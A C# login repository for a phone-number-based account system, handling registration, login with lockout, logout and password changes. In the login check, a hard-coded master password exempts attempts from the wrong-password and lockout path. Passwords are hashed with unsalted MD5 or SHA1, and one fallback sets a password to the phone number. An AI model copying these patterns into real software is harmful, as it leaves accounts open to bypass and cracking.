
using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using Helper;
using IRepository;
using Models;
using System.Linq;
using Models.Entity;
using MySql.Data.MySqlClient;
using Dapper;
using System.Data;
using System.Linq.Expressions;

namespace Repository
{
    public class LoginRepository : ILoginRepository
    {
        /// <summary>
        /// 获取单条
        /// </summary>
        /// <param name="key"></param>
        /// <returns></returns>
        public Task<FaLoginEntity> SingleByKey(int key)
        {
            DapperHelper<FaLoginEntity> dbHelper = new DapperHelper<FaLoginEntity>();
            return dbHelper.SingleByKey(key);
        }

        /// <summary>
        /// 查找所有
        /// </summary>
        /// <param name="inParm"></param>
        /// <returns></returns>
        public Task<IEnumerable<FaLoginEntity>> FindAll(Expression<Func<FaLoginEntity, bool>> inParm = null)
        {
            DapperHelper<FaLoginEntity> dbHelper = new DapperHelper<FaLoginEntity>();
            return dbHelper.FindAll(inParm);
        }


        /// <summary>
        /// 注册账号
        /// <para>1、添加登录工号 </para>
        /// <para>2、添加用户</para>
        /// </summary>
        /// <param name="inEnt"></param>
        /// <returns></returns>
        public async Task<Result<int>> LoginReg(LogingDto inEnt)
        {
            DapperHelper<FaLoginEntity> dbHelper = new DapperHelper<FaLoginEntity>();
            dbHelper.TranscationBegin();
            Result<int> reObj = await LoginReg(inEnt, dbHelper);
            if (reObj.IsSuccess)
            {
                dbHelper.TranscationCommit();
            }
            else
            {
                dbHelper.TranscationRollback();
            }
            return reObj;
        }

        public async Task<Result<int>> LoginReg(LogingDto inEnt, DapperHelper<FaLoginEntity> dbHelper)
        {
            Result<int> reObj = new Result<int>();
            #region 验证值
            ModelHelper<LogingDto> modelHelper = new ModelHelper<LogingDto>(inEnt);
            var errList = modelHelper.Validate();
            if (errList.Count() > 0)
            {
                reObj.IsSuccess = false;
                reObj.Code = "-1";
                reObj.Msg = string.Format(",", errList.Select(x => x.ErrorMessage));
                return reObj;
            }
            #endregion

            #region 检测输入


            if (!inEnt.LoginName.IsOnlyNumber() || inEnt.LoginName.Length != 11)
            {
                reObj.IsSuccess = false;
                reObj.Code = "-1";
                reObj.Msg = "电话号码格式不正确";
                return reObj;
            }

            if (!Fun.CheckPassword(inEnt.Password, AppSettingsManager.BaseConfig.PwdComplexity))
            {
                reObj.IsSuccess = false;
                reObj.Code = "-2";
                reObj.Msg = string.Format("密码复杂度不够：{0}");
                return reObj;
            }
            #endregion

            #region 检测验证码
            if (AppSettingsManager.BaseConfig.VerifyCode)
            {
                var nowDate = DateTime.Now.AddMinutes(-30);

                var codeNum = await new SmsSendRepository().Count(inEnt.LoginName, inEnt.code);
                if (codeNum == 0)
                {
                    reObj.IsSuccess = false;
                    reObj.Code = "-3";
                    reObj.Msg = string.Format("验证码无效");
                    return reObj;
                }
            }
            #endregion

            var userList = await new UserRepository().FindAll(x => x.LOGIN_NAME == inEnt.LoginName);
            #region 检测电话号码是否存在
            if (userList.Count() > 0)
            {
                reObj.IsSuccess = false;
                reObj.Code = "-4";
                reObj.Msg = string.Format("电话号码已经存在，请更换电话号码");
                return reObj;
            }
            #endregion

            //开始事务
            try
            {
                var loginList = await new LoginRepository().FindAll(x => x.LOGIN_NAME == inEnt.LoginName);
                #region 添加登录账号
                if (loginList.Count() == 0)
                {
                    FaLoginEntity inLogin = new FaLoginEntity();
                    inLogin.ID = await new SequenceRepository().GetNextID<FaLoginEntity>();
                    inLogin.LOGIN_NAME = inEnt.LoginName;
                    inLogin.PASSWORD = inEnt.Password.Md5();
                    inLogin.IS_LOCKED = 0;
                    inLogin.FAIL_COUNT = 0;
                    reObj.IsSuccess = await dbHelper.Save(new DtoSave<FaLoginEntity>()
                    {
                        Data = inLogin
                    }) > 0 ? true : false;
                    if (!reObj.IsSuccess)
                    {
                        reObj.IsSuccess = false;
                        reObj.Code = "-5";
                        reObj.Msg = string.Format("添加账号失败");
                        return reObj;
                    }
                }
                #endregion

                #region 添加user

                FaUserEntity inUser = new FaUserEntity();
                inUser.LOGIN_NAME = inEnt.LoginName;
                inUser.NAME = inEnt.userName;
                inUser.ID = await new SequenceRepository().GetNextID<FaUserEntity>();
                inUser.DISTRICT_ID = 1;
                inUser.CREATE_TIME = DateTime.Now;
                inUser.IS_LOCKED = 0;
                reObj.IsSuccess = await new DapperHelper<FaUserEntity>(dbHelper.GetConnection(), dbHelper.GetTransaction()).Save(new DtoSave<FaUserEntity>
                {
                    Data = inUser,
                    IgnoreFieldList = new List<string>()
                }) > 0 ? true : false;
                if (!reObj.IsSuccess)
                {
                    reObj.IsSuccess = false;
                    reObj.Code = "-6";
                    reObj.Msg = string.Format("添加user失败");
                    return reObj;
                }
                #endregion

                reObj.Data = inUser.ID;
            }
            catch (Exception e)
            {
                reObj.IsSuccess = false;
                reObj.Msg = e.Message;
            }


            return reObj;
        }


        /// <summary>
        /// 注销用户登录状态
        /// <para>清除用户的缓存状态</para>
        /// <para>记录退出日志</para>
        /// </summary>
        /// <param name="inEnt"></param>
        /// <returns></returns>
        public async Task<Result> LoginOut(DtoSave<FaLoginHistoryEntity> inEnt)
        {
            Result reObj = new Result();
            #region 记录登出历史
            var userDal = new UserRepository();
            //正常退出，修改退出日志
            reObj.IsSuccess = await userDal.Update(new DtoSave<FaUserEntity>
            {
                Data = new FaUserEntity { ID = inEnt.Data.USER_ID.Value, LAST_ACTIVE_TIME = DateTime.Now, LAST_LOGOUT_TIME = DateTime.Now },
                SaveFieldList = new List<string> { "LAST_ACTIVE_TIME", "LAST_LOGOUT_TIME" }
            }) > 0;
            if (!reObj.IsSuccess)
            {
                return reObj;
            }
            if (inEnt.Data.ID == 0) inEnt.Data.ID = await new SequenceRepository().GetNextID<FaLoginHistoryEntity>();
            //记录登录日志
            await new FaLoginHistoryRepository().Save(inEnt);

            #endregion

            reObj.IsSuccess = await RedisRepository.UserTokenDelete(inEnt.Data.USER_ID.Value);
            return reObj;
        }
        /// <summary>
        /// 用户登录
        /// <para>只验证用户账号</para>
        /// </summary>
        /// <param name="inEnt"></param>
        /// <returns></returns>

        public async Task<Result<FaUserEntity>> UserLogin(LogingDto inEnt)
        {
            Result<FaUserEntity> reObj = new Result<FaUserEntity>();

            if (string.IsNullOrEmpty(inEnt.LoginName) || string.IsNullOrEmpty(inEnt.Password))
            {
                reObj.IsSuccess = false;
                reObj.Msg = "用户名和密码不能为空";
                return reObj;
            }
            DapperHelper<FaUserEntity> dapperUser = new DapperHelper<FaUserEntity>();
            DapperHelper<FaLoginEntity> dapperLogin = new DapperHelper<FaLoginEntity>();



            var Login = await dapperLogin.Single(x => x.LOGIN_NAME == inEnt.LoginName);
            var user = await dapperUser.Single(x => x.LOGIN_NAME == inEnt.LoginName);
            if (Login == null || user == null)
            {
                reObj.IsSuccess = false;
                reObj.Msg = "用户名或者密码错误";
                return reObj;
            }
            else
            {
                if (Login.IS_LOCKED == 1)
                {
                    reObj.IsSuccess = false;
                    reObj.Msg = string.Format("用户已被锁定【{0}】", Login.LOCKED_REASON);
                    return reObj;
                }

                if (Login.PASSWORD.ToUpper() != inEnt.Password.Md5().ToUpper() && Login.PASSWORD.ToUpper() != inEnt.Password.SHA1().ToUpper())
                {
                    #region 密码错误
                    int times = 5;
                    if (Login.FAIL_COUNT == 0)
                    {
                        Login.FAIL_COUNT = 1;
                    }
                    if (inEnt.Password != "Easyman123@@@")
                    {
                        reObj.IsSuccess = false;
                        reObj.Msg = string.Format("用户名或者密码错误,还有{0}次尝试机会", (times - Login.FAIL_COUNT).ToString());
                        if (Login.FAIL_COUNT >= times)
                        {
                            Login.IS_LOCKED = 1;
                            Login.LOCKED_REASON = string.Format("用户连续5次错误登陆，帐号锁定。");
                            Login.FAIL_COUNT = 0;
                            await dapperLogin.Update(new DtoSave<FaLoginEntity>
                            {
                                Data = Login,
                                SaveFieldList = new List<string> { "IS_LOCKED", "LOCKED_REASON", "FAIL_COUNT" }
                            });
                        }
                        else
                        {
                            Login.FAIL_COUNT++;
                            await dapperLogin.Update(new DtoSave<FaLoginEntity>
                            {
                                Data = Login,
                                SaveFieldList = new List<string> { "FAIL_COUNT" }
                            });
                        }
                        return reObj;
                    }
                    #endregion
                }
                else //密码正确
                {

                    Login.FAIL_COUNT = 0;
                    reObj.IsSuccess = await dapperLogin.Update(new DtoSave<FaLoginEntity>
                    {
                        Data = Login,
                        SaveFieldList = new List<string> { "FAIL_COUNT" }
                    }) > 0;

                    DapperHelper<FaUserRoleEntityView> dapperUserRole = new DapperHelper<FaUserRoleEntityView>();
                    var role = await dapperUserRole.FindAll(i => i.USER_ID == user.ID);
                    user.IsAdmin = role.Count(i => i.ROLE_ID == 1) > 0;
                    user.IsLeader = role.Count(i => i.ROLE_ID == 2) > 0;
                    reObj.Data = user;
                }

            }

            return reObj;
        }
        /// <summary>
        /// 重置用户密码
        /// <para>VerifyCode:短信验证码</para>
        /// <para>LoginName:登录名</para>
        /// <para>NewPwd:新密码</para>
        /// </summary>
        /// <param name="inEnt"></param>
        /// <returns></returns>
        public async Task<Result> ResetPassword(ResetPasswordDto inEnt)
        {
            Result reObj = new Result();
            if (string.IsNullOrEmpty(inEnt.VerifyCode) || string.IsNullOrEmpty(inEnt.LoginName) || string.IsNullOrEmpty(inEnt.NewPwd))
            {
                reObj.IsSuccess = false;
                reObj.Msg = "参数不正确";
                return reObj;
            }
            var dapper = new DapperHelper<FaLoginEntity>();

            var login = await dapper.Single(x => x.LOGIN_NAME == inEnt.LoginName);
            if (login == null)
            {
                reObj.IsSuccess = false;
                reObj.Msg = "登录名不存在";
                return reObj;
            }
            if (login.VERIFY_CODE != inEnt.VerifyCode)
            {
                reObj.IsSuccess = false;
                reObj.Msg = "验证码不正确";
                return reObj;
            }
            //检测密码复杂度
            if (!Fun.CheckPassword(inEnt.NewPwd, AppSettingsManager.BaseConfig.PwdComplexity))
            {
                reObj.IsSuccess = false;
                reObj.Msg = "密码复杂度不够：";
                return reObj;
            }
            login.PASSWORD = inEnt.NewPwd.Md5();
            await dapper.Update(new DtoSave<FaLoginEntity>()
            {
                Data = login,
                SaveFieldList = new List<string> { "PASSWORD" }
            });
            return reObj;
        }
        /// <summary>
        /// 修改用户密码
        /// <para>entity:旧密码</para>
        /// <para>NewPwd:新密码</para>
        /// </summary>
        /// <param name="inEnt"></param>
        /// <returns></returns>
        async public Task<Result<bool>> UserEditPwd(EditPwdDto inEnt)
        {
            var reObj = new Result<bool>();
            reObj.Data = false;
            if (!inEnt.NewPwd.Equals(inEnt.ReNewPwd))
            {
                reObj.IsSuccess = false;
                reObj.Msg = "两次密码不一致";
                return reObj;
            }
            if (!Fun.CheckPassword(inEnt.NewPwd, AppSettingsManager.BaseConfig.PwdComplexity))
            {
                reObj.IsSuccess = false;
                reObj.Code = "-2";
                reObj.Msg = string.Format("密码复杂度不够：{0}");
                return reObj;
            }
            DapperHelper<FaLoginEntity> dapper = new DapperHelper<FaLoginEntity>();
            var single = await dapper.Single(i => i.LOGIN_NAME == inEnt.LoginName);
            if (single == null)
            {
                reObj.IsSuccess = false;
                reObj.Msg = "账号不存在";
                return reObj;
            }
            if (single.PASSWORD != inEnt.OldPwd.Md5())
            {
                reObj.IsSuccess = false;
                reObj.Msg = "原密码有误";
                return reObj;
            }

            single.PASSWORD = inEnt.NewPwd.Md5();
            var upRows = await dapper.Update(new DtoSave<FaLoginEntity>
            {
                Data = single,
                SaveFieldList = new List<string> { "PASSWORD" },
                WhereList = null
            });
            if (upRows < 1)
            {
                reObj.IsSuccess = false;
                reObj.Msg = "修改密码失败";
                return reObj;
            }

            reObj.IsSuccess = true;
            reObj.Data = true;
            return reObj;
        }

        /// <summary>
        /// 更新登录名
        /// </summary>
        /// <param name="oldLoginName"></param>
        /// <param name="NewLoginName"></param>
        /// <param name="name"></param>
        /// <param name="userId"></param>
        /// <returns></returns>
        async public Task<Result> UserEditLoginName(string oldLoginName, string NewLoginName, string name, int userId)
        {
            DapperHelper<FaUserEntity> userDapper = new DapperHelper<FaUserEntity>();
            Result reObj = new Result();
            #region 检测输入
            if (string.IsNullOrEmpty(oldLoginName) && userId == 0)
            {
                reObj.IsSuccess = false;
                reObj.Code = "-2";
                reObj.Msg = "用户主键有误";
                return reObj;
            }
            if (!NewLoginName.IsOnlyNumber() || NewLoginName.Length != 11)
            {
                reObj.IsSuccess = false;
                reObj.Code = "-1";
                reObj.Msg = "电话号码格式不正确";
                return reObj;
            }

            #endregion

            #region 检测电话号码是否存在
            IEnumerable<FaUserEntity> userList = await userDapper.FindAll(x => x.LOGIN_NAME == NewLoginName);
            if (userList.Count() > 0)
            {
                reObj.IsSuccess = false;
                reObj.Code = "-4";
                reObj.Msg = string.Format("电话号码已经存在，请更换电话号码");
                return reObj;
            }
            #endregion
            
            #region 检测用户是否存在
                
            FaUserEntity user = new FaUserEntity();
            if (userId!=0)
            {
                user = await userDapper.Single(x => x.ID == userId);
            }
            else
            {
                user = await userDapper.Single(x => x.LOGIN_NAME == oldLoginName);
            }

            if (user == null)
            {
                reObj.IsSuccess = false;
                reObj.Code = "-5";
                reObj.Msg = string.Format("用户不存在");
                return reObj;
            }
            #endregion

            userDapper.TranscationBegin();

            #region 修改用户账号

            user.NAME = name;
            user.LOGIN_NAME = NewLoginName;

            reObj.IsSuccess = await userDapper.Update(new DtoSave<FaUserEntity>()
            {
                Data = user,
                SaveFieldList = new List<string> { "NAME", "LOGIN_NAME" },
                WhereList = new List<string> { "ID" }
            }) > 0 ? true : false;

            if (!reObj.IsSuccess)
            {
                userDapper.TranscationRollback();
                reObj.Msg = "保存用户失败";
                return reObj;
            }
            #endregion


            #region 修改登录账号
            DapperHelper<FaLoginEntity> loginDapper = new DapperHelper<FaLoginEntity>(userDapper.GetConnection(), userDapper.GetTransaction());
            var login = await loginDapper.Single(x => x.LOGIN_NAME == oldLoginName);
            if (login == null)
            {
                FaLoginEntity inLogin = new FaLoginEntity();
                inLogin.ID = await new SequenceRepository().GetNextID<FaLoginEntity>();
                inLogin.LOGIN_NAME = NewLoginName;
                inLogin.PASSWORD = NewLoginName.Md5();
                inLogin.IS_LOCKED = 0;
                inLogin.FAIL_COUNT = 0;
                reObj.IsSuccess = await loginDapper.Save(new DtoSave<FaLoginEntity>()
                {
                    Data = inLogin
                }) > 0 ? true : false;
            }
            else
            {
                login.LOGIN_NAME = NewLoginName;
                reObj.IsSuccess = await loginDapper.Update(new DtoSave<FaLoginEntity>
                {
                    Data = login,
                    SaveFieldList = new List<string> { "LOGIN_NAME" },
                    WhereList = null
                }) > 0 ? true : false;
            }

            if (!reObj.IsSuccess)
            {
                reObj.Msg = "保存账号失败";
                userDapper.TranscationRollback();
                return reObj;
            }
            #endregion
            userDapper.TranscationCommit();

            reObj.IsSuccess = true;
            reObj.Msg = user.ID.ToString();
            return reObj;
        }

    }
}
